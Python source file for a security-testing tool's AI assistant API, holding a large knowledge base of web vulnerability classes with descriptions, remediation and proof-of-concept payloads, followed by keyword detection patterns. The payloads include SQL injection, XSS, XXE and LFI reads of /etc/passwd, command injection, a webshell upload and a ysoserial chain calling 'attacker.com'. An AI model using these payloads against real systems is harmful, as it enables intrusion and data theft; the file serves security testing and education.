"""AI assistant routes and helpers for the WebForge HTTP API."""

from __future__ import annotations

import concurrent.futures
import re
from concurrent.futures import ThreadPoolExecutor

from fastapi import APIRouter

from webforg.apps.api.models import (
    AiAnalyzeReq,
    AiChatReq,
    AiCvePocReq,
    AiExploitReq,
)
from webforg.apps.api.shared import _S, _module_service, _parse_url

router = APIRouter()


LLM_API_KEY = _S.llm_api_key

LLM_BASE_URL = _S.llm_base_url

LLM_MODEL = _S.llm_model

def _llm_status() -> dict:
    return {
        "configured": bool(LLM_API_KEY),
        "model": LLM_MODEL if LLM_API_KEY else None,
        "mode": "llm" if LLM_API_KEY else "offline",
    }

def _llm_chat(system: str, user: str, max_tokens: int = 800, timeout: float = 30.0) -> str | None:
    """Call the configured OpenAI-compatible LLM. Returns None when not configured or on error."""
    if not LLM_API_KEY:
        return None
    import httpx
    try:
        resp = httpx.post(
            f"{LLM_BASE_URL.rstrip('/')}/chat/completions",
            headers={"Authorization": f"Bearer {LLM_API_KEY}", "Content-Type": "application/json"},
            json={
                "model": LLM_MODEL,
                "messages": [
                    {"role": "system", "content": system},
                    {"role": "user", "content": user},
                ],
                "max_tokens": max_tokens,
                "temperature": 0.3,
            },
            timeout=timeout,
        )
        resp.raise_for_status()
        data = resp.json()
        content = data["choices"][0]["message"]["content"].strip()
        return content or None
    except Exception:
        return None

def _kb_context(kb_matches: list[dict]) -> str:
    parts = []
    for m in kb_matches[:4]:
        parts.append(
            f"- {m['label']} ({m.get('cwe', 'N/A')}) [{m.get('severity', 'N/A')}]:\n"
            f"  Description: {m.get('description', '')}\n"
            f"  PoC: {m.get('poc', '')}\n"
            f"  Fix: {m.get('remediation', '')}"
        )
    return "\n".join(parts) if parts else "(no local KB matches)"

def _cve_intel_text(cve_ids: list[str], cve_data: dict | None) -> str:
    if not cve_ids:
        return "(no CVE referenced)"
    if not cve_data or not cve_data.get("success"):
        err = cve_data.get("error", "lookup failed") if cve_data else "not queried"
        return f"- {cve_ids[0]}: intel unavailable ({err})"
    lines = [
        f"- {cve_ids[0]}: Severity {cve_data.get('severity', 'N/A')}, "
        f"CVSS {cve_data.get('cvss_score', 'N/A')}, EPSS {cve_data.get('epss_score', 'N/A')}, "
        f"KEV {cve_data.get('kev', 'N/A')}, CWE {', '.join(cve_data.get('cwe', [])) or 'N/A'}"
    ]
    if cve_data.get("description"):
        lines.append(f"  Description: {cve_data['description']}")
    gh = cve_data.get("sources", {}).get("github") or {}
    if gh.get("pocs"):
        lines.append("  Top GitHub PoCs:")
        for poc in gh["pocs"][:3]:
            lines.append(f"    - {poc.get('name') or poc.get('html_url')} (⭐{poc.get('stargazers', 0)}) — {poc.get('html_url')}")
    other = cve_data.get("sources", {}).get("metasploit_exploitdb_nuclei") or {}
    for key, label in (("metasploit", "Metasploit"), ("exploitdb", "ExploitDB"), ("nuclei", "Nuclei")):
        if other.get(key):
            lines.append(f"  {label}: `{other[key].get('command', '')}`")
    if cve_data.get("remediation"):
        lines.append(f"  Fix: {cve_data['remediation']}")
    return "\n".join(lines)

@router.get("/api/ai/llm/status")
def ai_llm_status():
    return _llm_status()

AI_KB: dict = {
    "sql_injection": {
        "label": "SQL Injection",
        "description": "SQL injection occurs when user input is improperly sanitized and directly concatenated into SQL queries. Attackers can manipulate queries to extract data, bypass authentication, or execute administrative operations.",
        "severity": "CRITICAL",
        "poc": "Inject: `' OR '1'='1` into login fields, or `' UNION SELECT table_name,column_name FROM information_schema.columns --` into URL parameters to extract database schema.",
        "module": "exploits/sqli_exploit",
        "remediation": "Use parameterized queries / prepared statements. Never concatenate user input into SQL. Apply strict input validation and use WAF rules.",
        "cwe": "CWE-89"
    },
    "xss": {
        "label": "Cross-Site Scripting (XSS)",
        "description": "XSS allows attackers to inject malicious scripts into web pages viewed by other users. Stored XSS persists on the server, Reflected XSS is in the response, DOM-based XSS occurs in client-side scripts.",
        "severity": "HIGH",
        "poc": "Inject: `<script>alert(document.cookie)</script>` into input fields or URL parameters. For blind XSS, use: `\"><img src=x onerror=alert(1)>`",
        "module": "auxiliary/scanners/xss_scanner",
        "remediation": "Implement Content Security Policy (CSP). Encode output contextually. Validate and sanitize all user input server-side.",
        "cwe": "CWE-79"
    },
    "lfi": {
        "label": "Local File Inclusion (LFI)",
        "description": "LFI allows attackers to read arbitrary files on the server by manipulating file path parameters. Can lead to RCE via log poisoning or PHP wrappers.",
        "severity": "HIGH",
        "poc": "Try: `../../../etc/passwd` in file parameters. For PHP: `php://filter/convert.base64-encode/resource=index.php` to read source code.",
        "module": "exploits/lfi_exploit",
        "remediation": "Whitelist allowed files. Avoid passing user input directly to file system functions. Use a mapping layer instead of direct paths.",
        "cwe": "CWE-98"
    },
    "rfi": {
        "label": "Remote File Inclusion (RFI)",
        "description": "RFI allows attackers to include remote files, often leading to RCE. Common in PHP applications with dynamic includes.",
        "severity": "CRITICAL",
        "poc": "Inject a remote URL containing malicious code into file parameters: `http://attacker.com/shell.txt`",
        "module": "exploits/rfi_exploit",
        "remediation": "Disable allow_url_include in php.ini. Never pass user input to include/require functions. Use whitelist-based inclusion.",
        "cwe": "CWE-829"
    },
    "ssti": {
        "label": "Server-Side Template Injection (SSTI)",
        "description": "SSTI occurs when user input is embedded in server-side templates without proper sanitization. Can lead to RCE in template engines like Jinja2, Twig, FreeMarker.",
        "severity": "CRITICAL",
        "poc": "Inject: `{{ 7*7 }}` in template fields. For Jinja2 RCE: `{{ ''.__class__.__mro__[2].__subclasses__() }}` to enumerate classes.",
        "module": "exploits/ssti_exploit",
        "remediation": "Avoid rendering user input in templates. Use sandboxed template environments. Apply contextual output encoding.",
        "cwe": "CWE-1336"
    },
    "ssrf": {
        "label": "Server-Side Request Forgery (SSRF)",
        "description": "SSRF tricks the server into making requests to internal resources. Can be used to access cloud metadata, internal services, or bypass firewalls.",
        "severity": "HIGH",
        "poc": "Inject internal URLs into parameters: `http://169.254.169.254/latest/meta-data/` (AWS) or `http://localhost:9200` (Elasticsearch)",
        "module": "auxiliary/scanners/ssrf_scanner",
        "remediation": "Whitelist allowed outbound destinations. Block private IP ranges. Validate and sanitize URL scheme and host.",
        "cwe": "CWE-918"
    },
    "command_injection": {
        "label": "Command Injection",
        "description": "Command injection allows executing arbitrary OS commands via unsanitized input passed to system shells. Often found in ping, nslookup, and file download features.",
        "severity": "CRITICAL",
        "poc": "Inject: `; id` or `| whoami` or `$(cat /etc/passwd)` into command parameters or headers like User-Agent.",
        "module": "exploits/cmdi_exploit",
        "remediation": "Avoid shell execution where possible. Use subprocess with argument lists instead of shell strings. Strict input validation.",
        "cwe": "CWE-78"
    },
    "open_redirect": {
        "label": "Open Redirect",
        "description": "Open redirect allows attackers to redirect users to malicious sites via unvalidated redirect parameters. Useful for phishing campaigns.",
        "severity": "MEDIUM",
        "poc": "Inject: `//evil.com` or `https://evil.com` in redirect parameters like `?next=`, `?url=`, `?redirect=`",
        "module": "auxiliary/scanners/open_redirect",
        "remediation": "Whitelist allowed redirect destinations. Use indirect reference maps instead of direct URLs.",
        "cwe": "CWE-601"
    },
    "idor": {
        "label": "Insecure Direct Object Reference (IDOR)",
        "description": "IDOR occurs when an application exposes direct references to internal objects (files, database keys) without proper authorization checks.",
        "severity": "HIGH",
        "poc": "Modify sequential IDs in URL or API requests: `/api/user/1` -> `/api/user/2`. Try incrementing or decrementing IDs in POST bodies.",
        "module": "auxiliary/scanners/idor_scanner",
        "remediation": "Implement proper access controls. Use indirect reference maps. Never expose internal IDs directly.",
        "cwe": "CWE-639"
    },
    "xxe": {
        "label": "XML External Entity (XXE)",
        "description": "XXE allows attackers to read files, perform SSRF, or cause DoS by injecting malicious XML entities. Common in SOAP APIs and XML parsers.",
        "severity": "CRITICAL",
        "poc": "Inject: `<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>` into XML inputs.",
        "module": "exploits/xxe_exploit",
        "remediation": "Disable DTD processing and external entity resolution in XML parsers. Use JSON where possible.",
        "cwe": "CWE-611"
    },
    "weak_password": {
        "label": "Weak Password / Credential Exposure",
        "description": "Weak or default credentials allow attackers to authenticate as legitimate users. Often found with default passwords for admin panels, IoT devices, and databases.",
        "severity": "HIGH",
        "poc": "Try common credentials: `admin:admin`, `root:toor`, `admin:password123`. Use credential stuffing with known breach data.",
        "module": "auxiliary/scanners/brute_force",
        "remediation": "Enforce strong password policies. Enable MFA. Change all default credentials. Use credential rotation.",
        "cwe": "CWE-521"
    },
    "information_disclosure": {
        "label": "Information Disclosure",
        "description": "Sensitive information (version numbers, stack traces, internal paths, API keys) exposed in responses, headers, or error messages.",
        "severity": "MEDIUM",
        "poc": "Access common paths: `/robots.txt`, `/.git/config`, `/server-status`, `/wp-json/`. Trigger errors with malformed input to see stack traces.",
        "module": "auxiliary/scanners/info_disclosure",
        "remediation": "Remove version banners. Use generic error pages. Restrict access to sensitive paths. Enable proper logging without exposing details.",
        "cwe": "CWE-200"
    },
    "csrf": {
        "label": "Cross-Site Request Forgery (CSRF)",
        "description": "CSRF tricks authenticated users into performing unwanted actions by crafting malicious requests that use the user's session.",
        "severity": "MEDIUM",
        "poc": "Create a form that auto-submits to the target: `<form action=\"https://target.com/change-password\" method=\"POST\"><input name=\"password\" value=\"hacked\"></form><script>document.forms[0].submit()</script>`",
        "module": "auxiliary/scanners/csrf_scanner",
        "remediation": "Use anti-CSRF tokens for state-changing requests. Implement SameSite cookie attribute. Validate Origin/Referer headers.",
        "cwe": "CWE-352"
    },
    "security_misconfig": {
        "label": "Security Misconfiguration",
        "description": "Improper security settings including default accounts, unnecessary services, missing security headers, directory listing, and verbose error messages.",
        "severity": "MEDIUM",
        "poc": "Check security headers: `curl -sI https://target.com | grep -i 'strict-transport\\|x-frame\\|x-content\\|x-xss'`. Check for directory listing on common paths.",
        "module": "auxiliary/scanners/misconfig_scanner",
        "remediation": "Harden server configuration. Disable unnecessary features. Apply CSP, HSTS, X-Frame-Options, and other security headers.",
        "cwe": "CWE-16"
    },
    "insecure_deserialization": {
        "label": "Insecure Deserialization",
        "description": "Insecure deserialization occurs when untrusted data is used to instantiate objects, leading to RCE, data tampering, or authentication bypass. Critical in Java, Python pickle, PHP unserialize, and .NET applications.",
        "severity": "CRITICAL",
        "poc": "Java: `java -jar ysoserial-all.jar CommonsCollections5 'curl http://attacker.com' | base64`. PHP: `O:7:\"Example\":1:{s:1:\"x\";s:5:\"evil\";}`. Python pickle: `__reduce__` based payloads.",
        "module": "exploits/deserialization_exploit",
        "remediation": "Use safe serialization formats like JSON. Validate and sign serialized data. Implement allow-listing for deserialized classes. Use integrity checks (HMAC).",
        "cwe": "CWE-502"
    },
    "nosql_injection": {
        "label": "NoSQL Injection",
        "description": "NoSQL injection targets MongoDB, CouchDB, and other NoSQL databases. Attackers inject operators like `$ne`, `$gt`, `$regex` to bypass authentication or extract data.",
        "severity": "CRITICAL",
        "poc": "Inject JSON operators: `{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}` or URL-encoded: `username[$ne]=admin&password[$ne]=x`",
        "module": "exploits/nosqli_exploit",
        "remediation": "Sanitize and validate all JSON input. Use strict schema validation. Avoid passing raw operator objects to queries. Use ORM parameterization.",
        "cwe": "CWE-943"
    },
    "ldap_injection": {
        "label": "LDAP Injection",
        "description": "LDAP injection exploits unsanitized input in LDAP queries, allowing attackers to modify filter logic, extract directory data, or bypass authentication.",
        "severity": "HIGH",
        "poc": "Inject: `admin*)(uid=*))` into login fields. For blind extraction: `(|(uid=admin)(uid=*))`",
        "module": "auxiliary/scanners/ldap_scanner",
        "remediation": "Escape LDAP special characters. Use parameterized LDAP queries. Validate input against a strict allowlist pattern.",
        "cwe": "CWE-90"
    },
    "xpath_injection": {
        "label": "XPath Injection",
        "description": "XPath injection allows attackers to manipulate XML queries, bypass authentication, or extract XML document contents.",
        "severity": "HIGH",
        "poc": "Inject: `' or '1'='1` into XPath queries. For data extraction: `'] | //* | //user[contains(*,'`",
        "module": "auxiliary/scanners/xpath_scanner",
        "remediation": "Use parameterized XPath queries. Apply input validation. Avoid constructing XPath by string concatenation.",
        "cwe": "CWE-643"
    },
    "http_smuggling": {
        "label": "HTTP Request Smuggling",
        "description": "HTTP request smuggling exploits discrepancies in how front-end proxies and back-end servers parse HTTP Content-Length and Transfer-Encoding headers to smuggle malicious requests past security controls.",
        "severity": "HIGH",
        "poc": "CL.TE: Send `POST / HTTP/1.1\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nFoo: x`. TE.CL: Swap the roles.",
        "module": "auxiliary/scanners/smuggling_scanner",
        "remediation": "Ensure consistent HTTP parsing across all intermediaries. Disable HTTP pipelining. Use HTTP/2. Normalize ambiguous requests.",
        "cwe": "CWE-444"
    },
    "websocket_hijack": {
        "label": "WebSocket Hijacking / CSWSH",
        "description": "Cross-Site WebSocket Hijacking allows attackers to read and write to WebSocket connections by abusing missing Origin checks. Can lead to session hijacking and data theft.",
        "severity": "HIGH",
        "poc": "Create an HTML page that opens `ws://target.com/socket` and sends messages. Test if WebSocket endpoint validates Origin header. Craft a CSWSH PoC with an `XMLHttpRequest` that upgrades to WebSocket.",
        "module": "auxiliary/scanners/ws_hijack",
        "remediation": "Validate Origin header on WebSocket upgrade. Use CSRF tokens in the initial handshake. Authenticate all WebSocket messages.",
        "cwe": "CWE-1385"
    },
    "cors_misconfig": {
        "label": "CORS Misconfiguration",
        "description": "Overly permissive CORS policies (reflecting Origin, allowing `*` with credentials) allow attackers to exfiltrate sensitive data cross-origin via JavaScript.",
        "severity": "MEDIUM",
        "poc": "Test with: `curl -H \"Origin: https://evil.com\" -I https://target.com/api`. If `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true` are reflected, the endpoint is vulnerable.",
        "module": "auxiliary/scanners/cors_scanner",
        "remediation": "Avoid reflecting Origin headers. Do not use `*` with credentials. Whitelist specific trusted origins. Use Vary: Origin header.",
        "cwe": "CWE-942"
    },
    "prototype_pollution": {
        "label": "Prototype Pollution",
        "description": "Prototype pollution targets JavaScript objects by injecting properties into `__proto__`, `constructor.prototype`, or `prototype` to alter application behavior globally. Common in Node.js libraries and browser JS.",
        "severity": "HIGH",
        "poc": "Inject via JSON: `{\"__proto__\": {\"isAdmin\": true}}` or query: `?__proto__[isAdmin]=true`. For server-side: `{\"constructor\": {\"prototype\": {\"shell\": \"node -e '...'\"}}}`",
        "module": "auxiliary/scanners/proto_pollution",
        "remediation": "Use `Object.create(null)` for plain objects. Freeze prototypes with `Object.freeze(Object.prototype)`. Use Map instead of plain objects. Validate JSON input recursively.",
        "cwe": "CWE-1321"
    },
    "ssi_injection": {
        "label": "Server-Side Includes (SSI) Injection",
        "description": "SSI injection allows attackers to execute system commands and include file contents by injecting SSI directives into fields that are processed by the web server (`.shtml`, `.stm`, `.shtm`).",
        "severity": "HIGH",
        "poc": "Inject: `<!--#exec cmd=\"whoami\" -->` or `<!--#include virtual=\"/etc/passwd\" -->` into input fields that appear on pages served with SSI enabled.",
        "module": "exploits/ssi_exploit",
        "remediation": "Disable SSI if not required. Sanitize user input displayed on SSI-enabled pages. Remove execute permissions for SSI directives.",
        "cwe": "CWE-96"
    },
    "race_condition": {
        "label": "Race Condition / TOCTOU",
        "description": "Race conditions (Time-of-Check-Time-of-Use) occur when a resource's state changes between the check and use operations. Common in payment systems, coupon codes, vote systems, and file operations.",
        "severity": "HIGH",
        "poc": "Send 50 concurrent requests for coupon redemption or gift card balance. Use `Turbo Intruder` or custom async scripts. Try file operations: `if os.path.exists(f): os.remove(f)` - swap the file between check and delete.",
        "module": "auxiliary/scanners/race_scanner",
        "remediation": "Use atomic operations (database transactions, compare-and-swap). Implement idempotency keys. Use database-level locking instead of application-level checks.",
        "cwe": "CWE-367"
    },
    "http_param_pollution": {
        "label": "HTTP Parameter Pollution (HPP)",
        "description": "HPP exploits how different backends handle duplicate parameters. Some take the first, some the last, some concatenate. Attackers override security controls by sending multiple params with the same name.",
        "severity": "MEDIUM",
        "poc": "Inject: `?admin=false&admin=true` or `?redirect=/safe&redirect=//evil.com`. In POST forms, add duplicate hidden fields. For headers, send `X-Forwarded-For: 127.0.0.1, X-Forwarded-For: malicious`.",
        "module": "auxiliary/scanners/hpp_scanner",
        "remediation": "Use strict parameter parsing. Reject multiple parameter values unless explicitly needed. Use array parameters with clear syntax: `?id[]=1&id[]=2`.",
        "cwe": "CWE-235"
    },
    "cache_poisoning": {
        "label": "Web Cache Poisoning / Deception",
        "description": "Cache poisoning tricks CDN/proxy caches into storing malicious responses served to all users. Cache deception tricks users into leaking sensitive data cached from error responses.",
        "severity": "HIGH",
        "poc": "Find unkeyed parameters (not in cache key) that affect response: `?cb=evil.com` in X-Forwarded-Host. For deception: request `/profile.php/nonexistent.css` - if cache stores the profile content as CSS, attacker can steal it.",
        "module": "auxiliary/scanners/cache_scanner",
        "remediation": "Never cache authenticated responses. Use `Cache-Control: private` for user-specific data. Make cookies part of the cache key. Disable caching for error pages.",
        "cwe": "CWE-524"
    },
    "api_abuse": {
        "label": "API Abuse / Mass Assignment",
        "description": "API abuse includes rate limiting bypass, mass assignment (binding unexpected fields), excessive data exposure, and improper asset management (old API versions still active).",
        "severity": "MEDIUM",
        "poc": "Mass assignment: `POST /api/user {\"name\":\"x\",\"role\":\"admin\",\"isAdmin\":true}`. Find old API versions: `/api/v1/user`, `/api/v2/user`. Bypass rate limits: `X-Forwarded-For` rotation, IP spoofing.",
        "module": "auxiliary/scanners/api_scanner",
        "remediation": "Use DTOs — never bind request bodies directly to models. Implement rate limiting with user context (not just IP). Version APIs properly and deprecate old versions. Use strict schema validation.",
        "cwe": "CWE-915"
    },
    "oauth_misconfig": {
        "label": "OAuth Misconfiguration",
        "description": "OAuth flaws include CSRF on the redirect_uri, code/state leakage, token reuse, and improper scope validation. Attackers hijack accounts by stealing authorization codes or tokens.",
        "severity": "HIGH",
        "poc": "Test redirect_uri bypass: `https://app.com/callback?code=xxx` -> change to `https://app.com/callback.evil.com`. Test for missing `state` parameter (CSRF). Try reusing codes at different redirect URIs. Scope escalation: modify `scope` parameter.",
        "module": "auxiliary/scanners/oauth_scanner",
        "remediation": "Validate redirect_uri strictly — exact match, no subdomain tricks. Always use and validate `state` parameter. Never reuse authorization codes. Validate token scopes on every request.",
        "cwe": "CWE-862"
    },
    "jwt_attacks": {
        "label": "JWT Attacks",
        "description": "JWT vulnerabilities include `alg: none`, weak HMAC secret, public key confusion (RS256->HS256), expired token reuse, and JWT injection in headers.",
        "severity": "CRITICAL",
        "poc": "None algorithm: change `alg` to `none`, remove signature. Weak secret: `hashcat -m 16500 jwt.txt rockyou.txt`. Key confusion: change `alg` from RS256 to HS256, sign with the public key. Silver bullet: set `jku` or `x5u` to attacker's JWKS URL.",
        "module": "auxiliary/scanners/jwt_scanner",
        "remediation": "Reject `alg: none` tokens. Use strong HMAC secrets (256-bit random). Do not mix symmetric and asymmetric algorithms (RS256 vs HS256). Use short token expiry. Validate `jku`/`x5u` against an allowlist.",
        "cwe": "CWE-290"
    },
    "graphql_injection": {
        "label": "GraphQL Injection / Introspection",
        "description": "GraphQL APIs may expose sensitive schema via introspection, allow query batching for brute force, or have injection points in GraphQL arguments that lead to SQLi or NoSQLi.",
        "severity": "HIGH",
        "poc": "Introspection: `POST /graphql {\"query\":\"query {__schema{types{name,fields{name}}}}\"}`. Batching: send 100 login mutations in one request. SQLi: `{\"query\":\"{user(id:\\\"1' OR '1'='1\\\"){name}}\"}`. Aliases for field duplication.",
        "module": "auxiliary/scanners/graphql_scanner",
        "remediation": "Disable introspection in production. Implement query depth limiting. Rate limit queries by complexity, not count. Use parameterized queries for database operations. Set max aliases per query.",
        "cwe": "CWE-200"
    },
    "clickjacking": {
        "label": "Clickjacking / UI Redress",
        "description": "Clickjacking tricks users into clicking invisible overlay elements on malicious pages to perform actions on the target application without consent.",
        "severity": "MEDIUM",
        "poc": "Test with: `<html><body><iframe src=\"https://target.com/admin/delete\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;\"></iframe><button style=\"position:absolute;top:50%;left:50%;\">Click me</button></body></html>`. If the page loads in the iframe, it is vulnerable.",
        "module": "auxiliary/scanners/clickjack_scanner",
        "remediation": "Always set `X-Frame-Options: DENY` or `SAMEORIGIN`. Use CSP `frame-ancestors 'none'` or `frame-ancestors 'self'`. Implement SameSite cookies.",
        "cwe": "CWE-1021"
    },
    "host_header_injection": {
        "label": "Host Header Injection",
        "description": "Host header injection occurs when the application trusts the `Host` header for URL generation, password resets, or cache keys. Attackers poison links and bypass security controls.",
        "severity": "HIGH",
        "poc": "Inject: `Host: evil.com` in requests. Check if password reset links use the Host header. Try: `X-Forwarded-Host: evil.com`. Combine with cache poisoning: `Host: target.com\"<script>alert(1)</script>`",
        "module": "auxiliary/scanners/host_header_scanner",
        "remediation": "Do not trust the Host header for URL generation. Use absolute paths or a configured server name. Validate Host against a whitelist. Use `SERVER_NAME` instead of `Host`.",
        "cwe": "CWE-644"
    },
    "crlf_injection": {
        "label": "CRLF Injection / HTTP Response Splitting",
        "description": "CRLF injection injects newline characters (`\\r\\n`) into HTTP headers or responses, allowing attackers to split responses, inject cookies, or perform XSS.",
        "severity": "HIGH",
        "poc": "Inject: `%0d%0aSet-Cookie:%20session=evil` in URL parameters reflected in headers. For log injection: `%0d%0aHTTP/1.1%20200%20OK%0d%0a...` to fake log entries.",
        "module": "auxiliary/scanners/crlf_scanner",
        "remediation": "Encode or reject newline characters (`%0d`, `%0a`, `\\r`, `\\n`) in user input. Use language-level header APIs that prevent injection. Never concatenate user input into headers.",
        "cwe": "CWE-113"
    },
    "subdomain_takeover": {
        "label": "Subdomain Takeover",
        "description": "Subdomain takeover occurs when a DNS CNAME points to an unclaimed cloud service (AWS S3, Heroku, GitHub Pages, Azure). Attackers claim the service and host malicious content under the target domain.",
        "severity": "HIGH",
        "poc": "Check for dangling CNAME records: `dig CNAME sub.target.com`. If it points to `something.cloudfront.net` (AWS) or `something.herokuapp.com`, try registering that resource. Tools: `subjack`, `nuclei -t takeovers/`.",
        "module": "auxiliary/scanners/subdomain_scanner",
        "remediation": "Remove DNS records for deprovisioned services. Use `canary tokens` / DNS validation to detect unclaimed resources. Regularly scan external DNS for dangling CNAMEs.",
        "cwe": "CWE-840"
    },
    "file_upload": {
        "label": "Unrestricted File Upload",
        "description": "Unrestricted file upload allows attackers to upload malicious files (shells, HTML, SVG with XSS) that can lead to RCE or content spoofing.",
        "severity": "CRITICAL",
        "poc": "Upload: `.php` shell, `.asp` webshell, `.svg` with XSS, `.html` with phishing form. Bypass filters: double extension `shell.php.jpg`, null byte `shell.php%00.jpg`, MIME type `image/gif` in header. For RCE: upload PHP shell and access `/uploads/shell.php?cmd=id`.",
        "module": "exploits/upload_exploit",
        "remediation": "Validate file extension AND MIME type AND content magic bytes. Store files outside webroot. Serve with `Content-Disposition: attachment`. Rename files to random hashes. Disable execute permissions on upload directories.",
        "cwe": "CWE-434"
    },
    "privilege_escalation": {
        "label": "Privilege Escalation",
        "description": "Privilege escalation attackers move from a lower-permission account to a higher one (vertical) or access another user's resources (horizontal). Common via IDOR, role manipulation, admin API calls, or token forgery.",
        "severity": "HIGH",
        "poc": "Horizontal: change `user_id` in API calls to another user's ID. Vertical: modify `role`, `is_admin`, `group` in JWT, cookies, or POST bodies. Test: `Cookie: role=admin`. Check if admin endpoints lack proper auth middleware.",
        "module": "auxiliary/scanners/priv_esc_scanner",
        "remediation": "Implement server-side authorization on every endpoint. Never trust client-side role declarations. Use least-privilege principle. Validate ownership on every resource access. Log and alert on suspicious privilege changes.",
        "cwe": "CWE-269"
    },
    "broken_auth": {
        "label": "Broken Authentication",
        "description": "Broken authentication includes weak password policies, credential stuffing susceptibility, session fixation, missing MFA, and improper logout/invalidation. Attackers compromise accounts through enumeration and bypass techniques.",
        "severity": "CRITICAL",
        "poc": "Test: rate limiting (send 100 login attempts), account enumeration (different error messages for valid/invalid users), session fixation (set `sessionid` before login), remember-me token analysis (base64 decode), password reset token brute force, MFA bypass via OAuth token reuse.",
        "module": "auxiliary/scanners/auth_scanner",
        "remediation": "Enforce strong password complexity. Implement account lockout and rate limiting. Use generic error messages. Rotate session IDs after login. Implement MFA. Use secure HttpOnly cookies. Invalidate all sessions on password change.",
        "cwe": "CWE-287"
    },
    "email_injection": {
        "label": "Email Injection / SMTP Header Injection",
        "description": "Email injection exploits unsanitized input in contact forms or email headers to inject additional recipients, attachments, or email body content, enabling phishing and spam relay.",
        "severity": "MEDIUM",
        "poc": "Inject: `\\r\\nCc: attacker@evil.com\\r\\nBcc: victims@evil.com` into name or email fields. For header injection: `evilhacker@test.com\\r\\nContent-Type: multipart/alternative...`. Test blind: send to a monitored inbox.",
        "module": "auxiliary/scanners/email_injection",
        "remediation": "Use email libraries that handle headers safely (never concatenate). Validate email format strictly. Do not allow newlines in email fields. Use allowlist-based template system for email construction.",
        "cwe": "CWE-93"
    },
    "business_logic": {
        "label": "Business Logic Flaws",
        "description": "Business logic flaws abuse design oversights in workflows — negative numbers in prices, quantity overflow, currency conversion rounding, multi-step process skipping, coupon stacking, and gift card draining.",
        "severity": "HIGH",
        "poc": "Try: negative quantities (`-1`), zero prices, decimal manipulation (`0.01` vs `.01`), step skipping (go directly to confirmation), parallel processing (redeem same coupon 50x), currency arbitrage (buy in USD, sell in EUR at better rate on same platform).",
        "module": "auxiliary/scanners/logic_scanner",
        "remediation": "Implement server-side validation on every step. Use idempotency keys for financial operations. Prevent negative values and overflow. Log all state transitions. Use database transactions with rollback on failure.",
        "cwe": "CWE-840"
    },
}

def _detect_vuln_type(text: str, url: str = "") -> list[dict]:
    """Analyze report text and detect vulnerability types with AI-like reasoning."""
    findings = []
    text_lower = text.lower()
    url_lower = url.lower()
    combined = text_lower + " " + url_lower

    patterns = {
        "sql_injection": ["sql", "sqli", "mysql", "postgresql", "sqlite", "oracle", "sqlmap", "union select",
                          "information_schema", "1=1", "1=2", "sql syntax", "odbc"],
        "xss": ["xss", "cross-site", "cross site", "script", "alert(", "javascript:", "onerror", "onload",
                "sanitize", "html injection", "stored xss", "reflected xss"],
        "lfi": ["lfi", "local file", "path traversal", "../", "..\\", "etc/passwd", "directory traversal",
                "file inclusion", "php://", "file_get_contents"],
        "rfi": ["rfi", "remote file", "allow_url_include", "remote inclusion", "http://"],
        "ssti": ["ssti", "template injection", "jinja2", "twig", "freemarker", "{{", "velocity",
                 "template engine", "thymeleaf"],
        "ssrf": ["ssrf", "server-side request", "internal network", "metadata", "169.254.169.254",
                 "localhost", "127.0.0.1", "internal service"],
        "command_injection": ["command injection", "cmdi", "rce", "remote code", "os command",
                              "shell_exec", "system(", "popen", "subprocess", "whoami", "| id", "; id"],
        "open_redirect": ["open redirect", "redirect", "unvalidated redirect", "forward", "next=",
                          "redirect_uri", "?url=", "?redirect="],
        "idor": ["idor", "insecure direct", "object reference", "authorization", "privilege escalation",
                 "horizontal", "vertical", "access control"],
        "xxe": ["xxe", "xml entity", "external entity", "document type definition", "dtd", "xml parser",
                "soap", "xml injection"],
        "weak_password": ["weak password", "default password", "default credential", "brute force",
                          "credential", "login bypass", "common password", "bruteforce"],
        "information_disclosure": ["information disclosure", "path disclosure", "stack trace",
                                   "error message", "sensitive data", "/robots.txt", ".git/config",
                                   "server header", "banner grab", "directory listing"],
        "csrf": ["csrf", "cross-site request", "cross site request", "anti-csrf", "csrf token",
                 "same-origin"],
        "security_misconfig": ["misconfiguration", "security header", "hsts", "x-frame-options",
                               "x-content-type", "csp", "strict-transport", "directory listing",
                               "default account", "unnecessary service"],
        "insecure_deserialization": ["deserialization", "unserialize", "pickle", "yaml.load",
                                     "object injection", "java serialization", "ysoserial",
                                     "json.deserialize", "marshal", "phar deserialization"],
        "nosql_injection": ["nosql", "mongodb", "couchdb", "$ne", "$gt", "$regex", "database injection",
                            "mongo injection"],
        "ldap_injection": ["ldap", "directory service", "active directory", "ldapsearch",
                           "ldap injection", "bind dn"],
        "xpath_injection": ["xpath", "xml query", "xquery"],
        "http_smuggling": ["smuggling", "request smuggling", "transfer-encoding", "te.cl", "content-length",
                           "http desync", "request splitting"],
        "websocket_hijack": ["websocket", "ws://", "wss://", "socket hijack", "ws hijacking"],
        "cors_misconfig": ["cors", "cross-origin", "access-control-allow-origin", "origin reflection",
                           "preflight"],
        "prototype_pollution": ["prototype", "pollution", "__proto__", "constructor.prototype",
                                "object.assign"],
        "ssi_injection": ["ssi", "server-side include", "<!--#exec", "<!--#include", ".shtml"],
        "race_condition": ["race condition", "toctou", "time of check", "concurrent", "double-spend",
                           "atomicity"],
        "http_param_pollution": ["parameter pollution", "hpp", "duplicate parameter", "parameter smuggling",
                                 "mass assignment"],
        "cache_poisoning": ["cache poisoning", "web cache", "cdn cache", "cache key", "cache deception",
                            "poisoned cache"],
        "api_abuse": ["api abuse", "rate limit", "api rate", "excessive data", "broken object level",
                      "bulk data", "enumeration"],
        "oauth_misconfig": ["oauth", "authorization code", "token theft", "redirect uri",
                            "oauth scope", "authorization server"],
        "jwt_attacks": ["jwt", "json web token", "token manipulation", "algorithm confusion", "none algorithm",
                        "rs256", "hs256", "jwk", "jku", "kty"],
        "graphql_injection": ["graphql", "introspection", "graphql injection", "query", "mutation",
                              "__schema"],
        "clickjacking": ["clickjacking", "click jacking", "frame injection", "iframe", "ui redress",
                         "x-frame-options missing", "frame-busting bypass"],
        "host_header_injection": ["host header", "host injection", "absolute url", "poisoned host",
                                  "cache poisoning host"],
        "crlf_injection": ["crlf", "response splitting", "header injection", "%0d%0a", "%0d", "%0a",
                           "carriage return", "line feed"],
